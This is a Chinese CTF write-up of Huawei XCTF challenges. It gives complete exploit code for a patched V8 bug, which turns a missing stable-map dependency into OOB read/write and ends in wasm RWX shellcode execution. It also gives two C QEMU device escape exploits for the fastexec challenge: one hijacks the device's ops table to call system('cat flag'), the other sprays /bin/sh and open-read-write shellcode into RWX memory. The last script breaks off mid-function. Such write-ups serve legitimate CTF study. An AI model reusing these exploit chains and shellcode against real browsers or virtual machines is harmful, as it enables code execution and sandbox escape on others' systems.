# 华为XCTF部分 Realworld && pwn 分析

阅读量 **174556**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-01-13 10:00:42

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

## 华为XCTF 第三场 v8

很幸运又一次抢到了一血

patch文件和wctf的indepence_day差不多，所以原理部分就分析WCTF那题

主要涉及map的stable和unstable

#####  利用过程：

利用漏洞更改另一个Array的size

在Array后面布置obj和ArraryBuffer

设置Addrof和任意地址读写原语

利用wasm来getshell

#####  脚本

    
    
    const MAX_ITERATIONS = 10000;
    var max_size = 1020*4;
    
    var buf =new ArrayBuffer(16);
    var float64 = new Float64Array(buf);
    var bigUint64 = new BigUint64Array(buf);
    var uint32 = new Uint32Array(buf);
    // Floating point to 64-bit unsigned integer
    function f2i(f)
    {
        float64[0] = f;
        return bigUint64[0];
    }
    // 64-bit unsigned integer to Floating point
    function i2f(i)
    {
        bigUint64[0] = i;
        return float64[0];
    }
    
    function f2half(val)
    {
        float64[0]= val;
        let tmp = Array.from(uint32);
        return tmp;
    }
    
    function half2f(val)
    {
        uint32.set(val);
        return float64[0];
    }
    // 64-bit unsigned integer to hex
    function hex(i)
    {
        return "0x"+i.toString(16).padStart(16, "0");
    }
    
    function wasm_func() {
        var wasmImports = {
            env: {
                puts: function puts (index) {
                    print(utf8ToString(h, index));
                }
            }
        };
    
        var buffer = new Uint8Array([0,97,115,109,1,0,0,0,1,137,128,128,128,0,2,
            96,1,127,1,127,96,0,0,2,140,128,128,128,0,1,3,101,110,118,4,112,117,
            116,115,0,0,3,130,128,128,128,0,1,1,4,132,128,128,128,0,1,112,0,0,5,
            131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,146,128,128,128,0,2,6,
            109,101,109,111,114,121,2,0,5,104,101,108,108,111,0,1,10,141,128,128,
            128,0,1,135,128,128,128,0,0,65,16,16,0,26,11,11,146,128,128,128,0,1,0,
            65,16,11,12,72,101,108,108,111,32,87,111,114,108,100,0]);
        let m = new WebAssembly.Instance(new WebAssembly.Module(buffer),wasmImports);
        let h = new Uint8Array(m.exports.memory.buffer);
        return m.exports.hello;  
    }
    // wasm obj
    func = wasm_func();
    //%DebugPrint(func);
    //%SystemBreak();
    // gc function to move data to old space
    function gc() {
        for (let i = 0; i < 100; i++) {
            new ArrayBuffer(0x100000);
        }
    }
    
    
    
    arr = [1.1, 1.2, 1.3,1.4];
    /* make the map stable */
    arr.x = 2;
    
    //var oob_array = [1.1,2.2];
    
    
    
    //%DebugPrint(arr);
    //%DebugPrint(oob_array);
    //%DebugPrint(obj_array);
    //%DebugPrint(big_uint_array);
    //%SystemBreak();
    
    // write back, form the oob_arr now
    console.log(half2f(0x20200000n));
    
    
    
    function foo1(idx) {
      for(let i = 0; i < 10000; i++);
      /* when accessing the global array, TurboFan will insert a StableMap
       * dependency instead of a CheckMaps node. Since we disabled dependencies
       * this will turn into an OOB write. */
      arr[idx] = 4.063e-320;
    }
    
    for (let i = 0; i < 1000; i++) {
      foo1(0);
    }
    
    /* change arr to dictionary map */
    arr[0x100000] = 1.23;
    
    /* allocate array to corrupt behind dictionary */
    let oob_array = [1.1, 1.2, 1.3, 1.4];
    var obj_array = {m:0xdead, n:func};
    var big_uint_array = new BigUint64Array(6);
    big_uint_array[0] = 0x1234n;
    big_uint_array[1] = 0x5678n;
    /* overwrite corrupt's backing store length */
    foo1(33);
    //%DebugPrint(arr);
    //%DebugPrint(corrupt);
    
    
    
    console.log(oob_array.length);
    var float_object_idx = 0;
    for(let i=0; i<max_size/2; i++) {
        if(f2half(oob_array[i])[1] == 0xdead<<1) {
            float_object_idx = i + 1;
            print("[+] float idx of object is: "+hex(float_object_idx));
            break;
        }
    } 
    
    // looking for the idx of big uint array
    var float_array_big_base_idx = 0;
    var float_array_big_external_idx = 0;
    var floag_array_big_len_idx = 0;
    for(let i=0; i<max_size/2; i++) {
        if(f2i(oob_array[i]) == 0x1234n) {
    
            float_array_big_len_idx = i+10;
            float_array_big_external_idx = i + 11;
            float_array_big_base_idx = i + 12;
            print("[+] float idx of big uint array len is: "+hex(float_array_big_base_idx));
            print("[+] float idx of big uint array base addr is: "+hex(float_array_big_base_idx));
            print("[+] float idx of big uint array external addr is: "+hex(float_array_big_external_idx));
            break;
        }
    }
    
    function Addr_of(obj)
    {
        obj_array.n = obj;
        let addr = f2half(oob_array[float_object_idx])[0];
        return BigInt(addr)
    }
    
    var big_uint_array_len = f2i(oob_array[float_array_big_len_idx]);
    var big_uint_array_base_ptr = f2i(oob_array[float_array_big_base_idx]);
    var big_uint_array_external_ptr = f2i(oob_array[float_array_big_external_idx]);
    
    var compress_heap_high_addr = big_uint_array_external_ptr & 0xffffffff00000000n;
    print ("[+] heap high addr: " + hex(compress_heap_high_addr));
    
    
    function In_heap_read64(addr)
    {
        oob_array[float_array_big_base_idx] = i2f(addr-0x8n);
        let val = big_uint_array[0];
        oob_array[float_array_big_base_idx] = i2f(big_uint_array_base_ptr);
        return val;
    
    }
    
    function In_heap_write64(addr, val)
    {
    
        oob_array[float_array_big_external_idx] = i2f(addr-0x8n);
        big_uint_array[0] = val;
        oob_array[float_array_big_external_idx] = i2f(big_uint_array_external_ptr);
        return;
    }
    
    function Byte_to_big_int_array(payload)
    {
    
        let sc = []
        let tmp = 0n;
        let len = BigInt(Math.ceil(payload.length/8))
        for (let i = 0n; i < len; i += 1n) {
            tmp = 0n;
            for(let j=0n; j<8n; j++){
                let c = payload[i*8n+j]
                if(c === undefined) {
                    c = 0;
                }
                tmp += BigInt(c)*(0x1n<<(8n*j));
            }
            sc.push(tmp);
        }
        return sc;
    }
    
    function In_heap_write(addr, payload)
    {
        let sc = Byte_to_big_int_array(payload);
    
        oob_array[float_array_big_len_idx] = i2f(sc.length);
        oob_array[float_array_big_base_idx] = i2f(addr-0x8n);
    
        for(let i = 0; i<sc.length; i+=i) {
            big_uint_array[i] = sc[i];
        }
    
        oob_array[float_array_big_base_idx] = i2f(big_uint_array_base_ptr);
        oob_array[float_array_big_len_idx] = big_uint_array_len;
    }
    
    function Arbitraty_write(addr, payload)
    {
    
        let sc = Byte_to_big_int_array(payload);
    
        oob_array[float_array_big_len_idx] = i2f(BigInt(sc.length));
        oob_array[float_array_big_base_idx] = i2f(0n);
        oob_array[float_array_big_external_idx] = i2f(addr);
        for(let i = 0; i<sc.length; i+=1) {
            big_uint_array[i] = sc[i];
        }
    
        oob_array[float_array_big_len_idx] = big_uint_array_len;
        oob_array[float_array_big_base_idx] = big_uint_array_base_ptr;
        oob_array[float_array_big_external_idx] = big_uint_array_external_ptr;
    }
    
    // %DebugPrint(func);
    var wasm_obj_addr = Addr_of(func);
    print("[+] wasm obj addr: "+hex(wasm_obj_addr));
    var shared_info_addr = In_heap_read64(wasm_obj_addr+0xcn)&0xffffffffn;
    print("[+] wasm shared info addr: "+hex(shared_info_addr));
    var wasm_exported_function_data_addr = In_heap_read64(shared_info_addr+4n)&0xffffffffn;
    print("[+] wasm exported function aata addr addr: "+hex(wasm_exported_function_data_addr));
    var instance_addr = In_heap_read64(wasm_exported_function_data_addr+0x8n)&0xffffffffn;
    print("[+] instance  addr addr: "+hex(instance_addr));
    var rwx_addr = In_heap_read64(instance_addr+0x68n);
    print("[+] rwx addr: "+hex(rwx_addr));
    // %SystemBreak();
    var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
        96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
        105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
        72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
        72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
        184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
        94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];
    
    var shellcode = ['0x48', '0x31', '0xf6', '0x56', '0x48', '0xbf', '0x2f', '0x62', '0x69', '0x6e', '0x2f', '0x63', '0x61', '0x74', '0x57', '0x49', '0x89', '0xe1', '0x54', '0x5f', '0x56', '0x48', '0xc7', '0xc6', '0x66', '0x6c', '0x61', '0x67', '0x56', '0x49', '0x89', '0xe0', '0x6a', '0x0', '0x41', '0x50', '0x41', '0x51', '0x54', '0x5e', '0x6a', '0x3b', '0x58', '0x99', '0xf', '0x5']
    var shellcode = ['0x48', '0x31', '0xf6', '0x56', '0x48', '0xbf', '0x2f', '0x62', '0x69', '0x6e', '0x2f', '0x2f', '0x73', '0x68', '0x57', '0x54', '0x5f', '0xb0', '0x3b', '0x99', '0xf', '0x5']
    
    
    let sc = Byte_to_big_int_array(shellcode);
    // %DebugPrint(big_uint_array);
    // %SystemBreak();
    Arbitraty_write(rwx_addr, shellcode);
    func();
    

###  2019 WCTF independence day

####  0 环境搭建

    
    
    git reset --hard c93858abcd73a4632db955392232ba1d1d21c3af
    git apply < ..\d8-strip-globals.patch
    git apply < ..\independence.patch
    gclient sync
    ninja -C out.gn/x64.release d8 8:19
    

####  1 背景知识

#####  transition chain

我们知道js对象是含有map的，transition chain指的是map的变换过程

下面举一个例子来介绍（例子来自某大佬一篇文章）

    
    
    const point = {};
    point.x = 4;
    point.y = 5;
    point.z = 6;
    

对应的map变换过程

![](https://p2.ssl.qhimg.com/t01657df37a1737730b.png)

我的理解是

每进行一次赋值，就有一次map的变化（当然这里还有immutable和mutable的区别）

整个map变化的过程就是一个transition chain

#####  stable map

首先推荐两篇关于stable map的文章

Project Zero: Trashing the Flow of Data (googleprojectzero.blogspot.com)

SSD Advisory – Chrome Turbofan Remote Code Execution

这里首先提一下map含有stable map和unstable map

前面讲过了transition chain，在transition chain的尾端就是stable map

下面举个例子

首先声明了一个对象，并用debugPrint打印了信息

之后进行了一次变换，再次打印信息

![](https://p1.ssl.qhimg.com/t01f504fad2f192136a.png)

由于这是最后一次变化，所以这是transition chain的尾端节点，所以这是一个stable_map，上图中也可以看出

#####  dependency

当一个Js对象的结构不符合JIT优化代码时，JIT代码就会进行deoptimized来防止类型混淆。v8中有两种方式来防止类型混淆

第一种是提供kCheckMaps节点，如果提供的map类型不符合，就会bails out

第二种当map所代表的结构发生变化，依赖于这个map的JIT代码会被标记为deoptimized，下一次调用的时候发生deoptimized

####  2 题目分析

patch脚本如下

第一个是将所有的install:Dependency代码注释了

    
    
    diff --git a/src/objects/code.cc b/src/objects/code.cc
    index 24817ca65c..4079f6077d 100644
    --- a/src/objects/code.cc
    +++ b/src/objects/code.cc
    @@ -925,6 +925,7 @@ void DependentCode::InstallDependency(Isolate* isolate,
                                           const MaybeObjectHandle& code,
                                           Handle<HeapObject> object,
                                           DependencyGroup group) {
    +#if 0
       Handle<DependentCode> old_deps(DependentCode::GetDependentCode(object),
                                      isolate);
       Handle<DependentCode> new_deps =
    @@ -932,6 +933,7 @@ void DependentCode::InstallDependency(Isolate* isolate,
       // Update the list head if necessary.
       if (!new_deps.is_identical_to(old_deps))
         DependentCode::SetDependentCode(object, new_deps);
    +#endif
     }
    
     Handle<DependentCode> DependentCode::InsertWeakCode(、
    
    
    
    第二个是将wasm禁用了
    
    commit 3794e5f0eeee3d421cc0d2a8d8b84ac82d37f10d
    Author: Your Name <you@example.com>
    Date:   Sat Dec 15 18:21:08 2018 +0100
    
        strip global in realms
    
    diff --git a/src/d8/d8.cc b/src/d8/d8.cc
    index 98bc56ad25..e72f528ae5 100644
    --- a/src/d8/d8.cc
    +++ b/src/d8/d8.cc
    @@ -1043,9 +1043,8 @@ MaybeLocal<Context> Shell::CreateRealm(
         }
         delete[] old_realms;
       }
    -  Local<ObjectTemplate> global_template = CreateGlobalTemplate(isolate);
       Local<Context> context =
    -      Context::New(isolate, nullptr, global_template, global_object);
    +      Context::New(isolate, nullptr, ObjectTemplate::New(isolate), v8::MaybeLocal<Value>());
       DCHECK(!try_catch.HasCaught());
       if (context.IsEmpty()) return MaybeLocal<Context>();
       InitializeModuleEmbedderData(context);
    

主要还是在于第一个patch的分析，文件注释了install:dependency的全部内容

起初不清楚dependency机制，所以并不清楚应该如何继续

####  3 漏洞分析

正如前面背景知识介绍的，Dependency机制是Map检查的一种方式

首先分析一下Map检查机制

src/compiler/property-access-builder.cc中的关键Buildcheckmap相关函数

    
    
    void PropertyAccessBuilder::BuildCheckMaps(
        Node* receiver, Node** effect, Node* control,
        ZoneVector<Handle<Map>> const& receiver_maps) {
      HeapObjectMatcher m(receiver);
      if (m.HasValue()) {
        MapRef receiver_map = m.Ref(broker()).map();
        if (receiver_map.is_stable()) {<==========判断是不是stable_map
          for (Handle<Map> map : receiver_maps) {
            if (MapRef(broker(), map).equals(receiver_map)) {
              dependencies()->DependOnStableMap(receiver_map);
              return;<==========如果是stablemap就经过dependonstableMap处理然后返回
            }
          }
        }
      }
      ZoneHandleSet<Map> maps;
      CheckMapsFlags flags = CheckMapsFlag::kNone;
      for (Handle<Map> map : receiver_maps) {
        MapRef receiver_map(broker(), map);
        maps.insert(receiver_map.object(), graph()->zone());
        if (receiver_map.is_migration_target()) {
          flags |= CheckMapsFlag::kTryMigrateInstance;
        }
      }
      *effect = graph()->NewNode(simplified()->CheckMaps(flags, maps), receiver,
                                 *effect, control);<==========如果不是stablemap就插入CheckMap节点
    }
    

仔细阅读上面的源码部分，在BuildCheckMap的时候是两个分支，如果对应的obj是stableMap就经过DependOnStableMap处理然后返回，否则就插入CheckMap节点。

关于DependOnStableMap函数（src/compiler/compilation-dependencies.cc）

    
    
    void CompilationDependencies::DependOnStableMap(const MapRef& map) {
      if (map.CanTransition()) {
        RecordDependency(new (zone_) StableMapDependency(map));<====调用
      } else {
        DCHECK(map.is_stable());
      }
    }
    
    
    
    void CompilationDependencies::RecordDependency(Dependency const* dependency) {
      if (dependency != nullptr) dependencies_.push_front(dependency);
    }
    

这个函数调用RecordDependency函数，将Map值压入一个dependency_对象中

所以，如果是stableMap的话，会注册一个 compilation dependencies的回调到map中

![](https://p3.ssl.qhimg.com/t017352c84ee93a3b87.png)

而这里的patch文件

    
    
    diff --git a/src/objects/code.cc b/src/objects/code.cc
    index 1004180669..b032e456b9 100644
    --- a/src/objects/code.cc
    +++ b/src/objects/code.cc
    @@ -943,18 +943,6 @@ void DependentCode::InstallDependency(Isolate* isolate,
                                           const MaybeObjectHandle& code,
                                           Handle<HeapObject> object,
                                           DependencyGroup group) {
    -  if (V8_UNLIKELY(FLAG_trace_code_dependencies)) {
    -    StdoutStream{} << "Installing dependency of [" << code->GetHeapObject()
    -                   << "] on [" << object << "] in group ["
    -                   << DependencyGroupName(group) << "]\n";
    -  }
    -  Handle<DependentCode> old_deps(DependentCode::GetDependentCode(object),
    -                                 isolate);
    -  Handle<DependentCode> new_deps =
    -      InsertWeakCode(isolate, old_deps, group, code);
    -  // Update the list head if necessary.
    -  if (!new_deps.is_identical_to(old_deps))
    -    DependentCode::SetDependentCode(object, new_deps);
     }
    
     Handle<DependentCode> DependentCode::InsertWeakCode(
    

删除了install compile dependency部分的代码

这个DependentCode::InstallDependency函数（即patch取消的函数）

![](https://p0.ssl.qhimg.com/t018ba74b905a8c45ec.png)

使得stableMap的dependency机制失效

如果我们使用一个stable map的arr，将不会有任何的类型检查，于是就有了一个type confusion。

####  4 POC 源码调试

poc.js

    
    
    arr = [1.1, 2.2, 3.3,4.4];
    // make the map stable
    arr.x = 1;
    function foo(idx) {
        return arr[idx];
    }
    // optimize foo
    for (i = 0; i < 100000; i++){
        foo(1);
    }
    // change arr to dictionary map
    arr[0x100000] = 5.5;
    %SystemBreak();
    console.log(foo(1000));
    
    %SystemBreak();
    

由于我们创建了Stable_map对象，所以调试的时候会在对应的BuildCheckMap位置断下

![](https://p4.ssl.qhimg.com/t014ace47d73e87750f.png)

之后又在stable_map的Install_dependency函数位置断下

![](https://p2.ssl.qhimg.com/t016ae19cd269bde33b.png)

由于Install_dependency函数被注释掉，所以这里相当于没有检查机制,所以就可以做很多……

## 华为XCTF 第一场fastexec

这题还是挺遗憾的，本地做的挺好，可惜远程传文件和cat
flag一步出了问题（原来flag文件命名是flag_+一串字符串）血亏，这里我用的方法是hint中的注入shellcode

###  0x01 程序功能

一个mmio_write（其中含有一次越界写）

![](https://p5.ssl.qhimg.com/t01a2e0667ddd230fb2.png)

一个mmio_read

![](https://p1.ssl.qhimg.com/t01f080e32658e64833.png)

静态条件下，device的结构

![](https://p1.ssl.qhimg.com/t01ea3dda4d3439dacf.png)

动态条件下的结构

![](https://p3.ssl.qhimg.com/t01c4cb2f270721346d.png)

打印不出全部，因为size不够

![](https://p3.ssl.qhimg.com/t013f8bad35e4414bb8.png)

###  0x02 题目漏洞与利用

####  漏洞

一次越界写

![](https://p2.ssl.qhimg.com/t0152724650f8f8bfb1.png)

#####  方法一

这个方法是haivk师傅做出来的，当时我在测试的时候没有弄好越界向上写，导致我认为只能够向下写，所以没有想到。

当时我是这样测试的

![](https://p2.ssl.qhimg.com/t01ac417a8204a88f8b.png)

动态调试的时候

在set off那一步

![](https://p3.ssl.qhimg.com/t01d5ab5c0e1869f105.png)

程序传进来的数字不是64位的负1，而是32位的

这就导致下面的内存(exec,off,size,addr)

![](https://p1.ssl.qhimg.com/t01aa1e8f88634608cf.png)

而结构体的位置+0xffffffff = 下面的位置（不是我们期待的上溢，而且也没用）

![](https://p3.ssl.qhimg.com/t01e6e7901608075bab.png)

所以我认为没有上溢

######  实现

haivk师傅具体描述如下

    
    
    可以考虑低字节写opaque，使得opaque设备对象向上移动，在内存里找到合适位置，使得opaque->execed为0，而其他字段有内容，这样，这可以利用设备的read函数，读取字段便可以泄露地址，而且由于opaque->execed为0，我们还可以再次进行任意地址写
    
    最后，我们可以劫持设备MemoryRegion里的ops和opaque，其中ops为虚表，我们劫持到可控区，opaque为rdi，可以作为参数，最后调用设备read即可触发。由于本题是低字节覆盖，因此需要爆破4bit，多次几次就可以成功。
    

首先看看上溢出的实现

![](https://p0.ssl.qhimg.com/t01432510305218a826.png)

首先设置要写的字节是0xef88, 设置off为-0xc0 ，设置size 为2

对应的动态内存

set off的时候

![](https://p1.ssl.qhimg.com/t01f5110c160a60038c.png)

对应的设置之后

![](https://p1.ssl.qhimg.com/t011e09e590bc862605.png)

![](https://p4.ssl.qhimg.com/t010f23ee0852ebbe41.png)

后来明白了 编译用的32位（害人不浅）

重新64位编译成功….（吐了）

下面的就顺利写完了

######  step1

change opaque指针

0xf010 – > 0xef88

![](https://p5.ssl.qhimg.com/t013521b86b94a4b664.png)

加上偏移之后的值

![](https://p0.ssl.qhimg.com/t01c95e7893d5d588b5.png)

修改之后的fake_struct

![](https://p5.ssl.qhimg.com/t01b85cc44ed26360ef.png)

此时进行mmio_read可以泄露exe_base

泄露base地址后

可以通过搜索然后交叉引用，一直找到plt表的system

######  step2

继续修改opaque_base

![](https://p1.ssl.qhimg.com/t0109ca8d15b91052b2.png)

![](https://p5.ssl.qhimg.com/t018c7a7b384013228c.png)

修改完base之后看一下内存

![](https://p1.ssl.qhimg.com/t012b665870aec8d2f9.png)

这次可以读取的是obj+off的一个地址

![](https://p1.ssl.qhimg.com/t01eb8dddc6ff8153cd.png)

获得了obj的地址以便于下一步的伪造

######  step3

伪造obj结构进行提权

    
    
       printf("obj_addr=0x%lx\n",obj_addr);
       d[0] = obj_addr + 0x948;
       d[1] = obj_addr + 0x950;
       d[2] = system_addr;
       char cmd[0x100] = "cat ";
       char *f = argv[1];
       int len = strlen(f);
       strcat(cmd,f);
       cmd[strlen(cmd)] = 0;
       //劫持设备对象
       memcpy(buffer+0x18,cmd,strlen(cmd)+1);
       mem_read_write(buffer_phys_addr,-0x80,0x18 + strlen(cmd)+1);
    

对应的内存位置

![](https://p2.ssl.qhimg.com/t016cce68b363425c67.png)

    
    
    Python>hex(0x00007f9d0acfefc8+0xa00-0x80)
    0x7f9d0acff948L
    

![](https://p2.ssl.qhimg.com/t015767b42b7cbf76b7.png)

对应的四个数字的含义(虚表+结构体+container?+size)

![](https://p3.ssl.qhimg.com/t01bea341d76cb64e8d.png)

进行修改之后的数据

![](https://p2.ssl.qhimg.com/t01839e2e3dfc933f99.png)

对应的含义

![](https://p2.ssl.qhimg.com/t01ea3dcb0aea5b24f3.png)

虚表位置改成了0x958也就是system的位置

对应的rdi就是结构体的位置（指向了size位置）

![](https://p0.ssl.qhimg.com/t01c0693235e5355033.png)

这样下次进行op操作就提权了

最终脚本

    
    
    #include <stdio.h>
    #include <stdlib.h>
    #include <stdint.h>
    #include <string.h>
    #include <fcntl.h>
    #include <sys/mman.h>
    
    #define PFN_MASK ((((size_t)1)<<54)-1)
    char *mmio;
    /*我们程序的缓冲在虚拟机里对应的物理地址*/
    size_t buffer_phys_addr;
    char *buffer;
    void die(char *msg) {
       perror(msg);
       exit(-1);
    }
    //写设备内存
    void mmio_write(uint64_t addr,uint64_t val) {
       *((uint64_t *)(mmio + addr)) = val;
    }
    //读设备内存
    uint64_t mmio_read(uint64_t addr) {
       return *((uint64_t *)(mmio + addr));
    }
    void setPhyAddr(uint64_t val) {
       mmio_write(24,val);
    }
    void setPos(uint64_t val) {
       mmio_write(8,val);
    }
    void setLength(uint64_t val) {
       mmio_write(16,val);
    }
    
    void mem_read_write(uint64_t phyAddr,uint64_t pos,uint64_t length) {
       setPhyAddr(phyAddr);
       setPos(pos);
       setLength(length);
       mmio_write(32,63021);
    }
    size_t get_phys_addr(char *vir_addr) {
       int fd = open("/proc/self/pagemap", O_RDONLY); /*打开页映射表*/
       if (fd == -1) {
          die("open pagemap error");
       }
       size_t vir = (size_t)vir_addr;
       // /0x1000获得是第n页的这个n，由于一个记录数据8字节，因此*8，算的的就是该页在文件里的记录的偏移
       size_t offset = vir / 0x1000 * 8;
       if (lseek(fd,offset,SEEK_SET) == -1) {
          die("lseek pagemap error");
       }
       size_t addr;
       if (read(fd,&addr,8) != 8) {
          die("read pagemap error");
       }
       addr = (addr & PFN_MASK) * 0x1000;
       return addr;
    }
    
    int main(int argc,char ** argv) {
       //打开设备
       int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0",O_RDWR);
       if (fd == -1) {
          die("open device error");
       }
       //映射设备内存
       mmio = mmap(NULL,0x1000,PROT_READ | PROT_WRITE, MAP_SHARED,fd,0);
       if (mmio == MAP_FAILED) {
          die("mmap device memory error");
       }
       /*映射一块缓冲区*/
       buffer = mmap(NULL,0x1000,PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS,-1,0);
       if (buffer == MAP_FAILED) {
          die("mmap local buffer error");
       }
       //必须锁住内存，才能准确获得物理地址
       mlock(buffer, 0x1000);
       //获得buffer的物理映射地址
       buffer_phys_addr = get_phys_addr(buffer);
       printf("buffer_phys_addr=0x%lx\n",buffer_phys_addr);
       uint64_t *d = (uint64_t*)buffer;
    
       size_t low = 0xf010 - 0x88;//0xf010每次都是   0xef88
       buffer[0] = low & 0xff; 
       low = low >> 8;//移动一个字节
       buffer[1] = low & 0xff;
    
       mem_read_write(buffer_phys_addr,-0xc0,2);
       size_t elf_base = mmio_read(16) - 0x31bd40;
       size_t system_addr = elf_base + 0x2C2180;
       printf("elf_base=0x%lx\n",elf_base);
       printf("system_addr=0x%lx\n",system_addr);
    
       //--------------------------------------------------------------------       low = 0xf010 - 0x48;//0xefc8
       buffer[0] = low & 0xff;
       low = low >> 0x8;
       buffer[1] = low & 0xff;
       mem_read_write(buffer_phys_addr,-0x38,0x2);//继续修改opqaue_base
    
       size_t obj_addr = mmio_read(0x8) - 0x998;
       printf("obj_addr=0x%lx\n",obj_addr);
    
    
    
    
       //拼接cat flag_32jr.....
       char cmd[0x100] = "cat ";
       char *f = argv[1];
       int len = strlen(f);
       strcat(cmd,f);
       cmd[strlen(cmd)] = 0;
    
       //伪造obj
       d[0] = obj_addr + 0x948;
       d[1] = obj_addr + 0x950;
       d[2] = system_addr;
       memcpy(buffer+0x18,cmd,strlen(cmd)+1);
    
       mem_read_write(buffer_phys_addr,-0x80,0x18 + strlen(cmd)+1);
    
       mmio_read(0x66);
    
    
       return 0;
    };
    

#####  方法二

观察到程序中有RWX断，并且根据内存分布，将off改大可以写到那个位置。

程序会自己执行到RWX段，所以利用一次写直接注入shellcode

首先观察到程序中含有RWX段，并且我实际尝试的时候在RWX段的某个位置下断点是可以断下来的，这个应该是一个什么机制吧（为什么能断下来我也没搞清楚）

![](https://p1.ssl.qhimg.com/t01ef68eec796cb49ac.png)

上图一个对应的是RWX段，一个对应的是我们的fastexec设备（在这次运行中RWX段位于上方），可以看到这个RWX段size特别大，而其它的段size相对较小，所以如果我们越界写的off设置的足够大（比如我用了0xaff0000），而此时如果RWX段位于fastexec设备的下面，那么这次越界写，就会写到rwx段

至于上方下方这个问题，每次运行是随机顺序的，比如之后的一次运行，这两个段顺序就进行了互换

![](https://p4.ssl.qhimg.com/t01f7e2c5b245c64f2e.png)

最终脚本

    
    
    #include <assert.h>
    #include <fcntl.h>
    #include <inttypes.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <sys/mman.h>
    #include <sys/types.h>
    #include <unistd.h>
    #include<sys/io.h>
    
    #define PAGE_SHIFT  12
    #define PAGE_SIZE   (1 << PAGE_SHIFT)
    #define PFN_PRESENT (1ull << 63)
    #define PFN_PFN     ((1ull << 55) - 1)
    
    #define DMABASE 0x40000
    char *userbuf;
    uint64_t phy_userbuf;
    unsigned char* mmio_mem;
    
    void die(const char* msg)
    {
        perror(msg);
        exit(-1);
    }
    
    uint64_t page_offset(uint64_t addr)
    {
        return addr & ((1 << PAGE_SHIFT) - 1);
    }
    
    uint64_t gva_to_gfn(void *addr)
    {
        uint64_t pme, gfn;
        size_t offset;
    
        int fd = open("/proc/self/pagemap", O_RDONLY);
        if (fd < 0) {
            die("open pagemap");
        }
        offset = ((uintptr_t)addr >> 9) & ~7;
        lseek(fd, offset, SEEK_SET);
        read(fd, &pme, 8);
        if (!(pme & PFN_PRESENT))
            return -1;
        gfn = pme & PFN_PFN;
        return gfn;
    }
    
    uint64_t gva_to_gpa(void *addr)
    {
        uint64_t gfn = gva_to_gfn(addr);
        assert(gfn != -1);
        return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
    }
    
    
    
    
    void mmio_write(uint32_t addr, uint32_t value)
    {
        *((uint32_t*)(mmio_mem + addr)) = value;
    }
    
    uint32_t mmio_read(uint32_t addr)
    {
        return *((uint32_t*)(mmio_mem + addr));
    }
    
    int main()
    {
    
        // Open and map I/O memory for the strng device
        int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
        if (mmio_fd == -1)//"/sys/devices/pci0000:00/0000:00:04.0/resource0"
            die("mmio_fd open failed");
    
        mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
        if (mmio_mem == MAP_FAILED)
            die("mmap mmio_mem failed");
    
        printf("mmio_mem @ %p\n", mmio_mem);
    
        // Allocate DMA buffer and obtain its physical address
        userbuf = mmap(0, 0xb00000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
        if (userbuf == MAP_FAILED)
            die("mmap");
    
        mlock(userbuf, 0xb00000);
        phy_userbuf=gva_to_gpa(userbuf);
        printf("user buff virtual address: %p\n",userbuf);
        printf("user buff physical address: %p\n",(void*)phy_userbuf);
    
        // char * s = malloc(0x500);
        unsigned char * nop = malloc(0x1000);
    
        unsigned char *sh_x64_21="\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05";
        // unsigned char *orw = "\x68\x66\x6C\x61\x67\x48\x89\xE7\x31\xF6\xB8\x02\x00\x00\x00\x0F\x05\x83\xF8\x00\x78\x1E\x89\xC7\x48\x89\xE6\xBA\x64\x00\x00\x00\x31\xC0\x0F\x05\x89\xC2\x48\x89\xE6\xB8\x01\x00\x00\x00\x89\xC7\x0F\x05\xEB\x29\x48\xB8\x6F\x70\x65\x6E\x20\x65\x72\x72\x48\x89\x04\x24\xB8\x6F\x72\x21\x0A\x48\x89\x44\x24\x08\x48\x89\xE6\xBF\x01\x00\x00\x00\xBA\x0C\x00\x00\x00\x89\xF8\x0F\x05\x31\xFF\xB8\xE7\x00\x00\x00\x0F\x05";
        unsigned char * orw = "\x48\xB8\x65\x37\x66\x64\x33\x00\x00\x00\x50\x48\xB8\x33\x61\x65\x34\x38\x64\x66\x64\x50\x48\xB8\x37\x63\x30\x30\x36\x63\x64\x34\x50\x48\xB8\x61\x39\x62\x64\x33\x65\x62\x30\x50\x48\xB8\x66\x6C\x61\x67\x5F\x35\x65\x63\x50\x48\x89\xE7\x31\xF6\xB8\x02\x00\x00\x00\x0F\x05\x83\xF8\x00\x78\x1C\x89\xC7\x48\x89\xE6\xBA\x64\x00\x00\x00\x31\xC0\x0F\x05\x89\xC2\x48\x89\xE6\xB8\x01\x00\x00\x00\x89\xC7\x0F\x05\x48\xB8\x6F\x70\x65\x6E\x20\x65\x72\x72\x0F\x05";
    
        memset(nop,'\x90',0xe30);
    
        int i=0;
        for(;i<255*11;i++)
        {
            memcpy(userbuf+i*0x1000,nop,0xe30);
            memcpy(userbuf+0xe30+i*0x1000,sh_x64_21,112);
            // printf();        
        }
    
    
        // printf("%s\n",nop);
    
        mmio_write(8, 0xaff0000);//0x539 0xb3e5f0  0x2936760 3？  0x96f000 
        mmio_write(0x10, 0x90000+0x100);
        mmio_write(0x18, phy_userbuf);
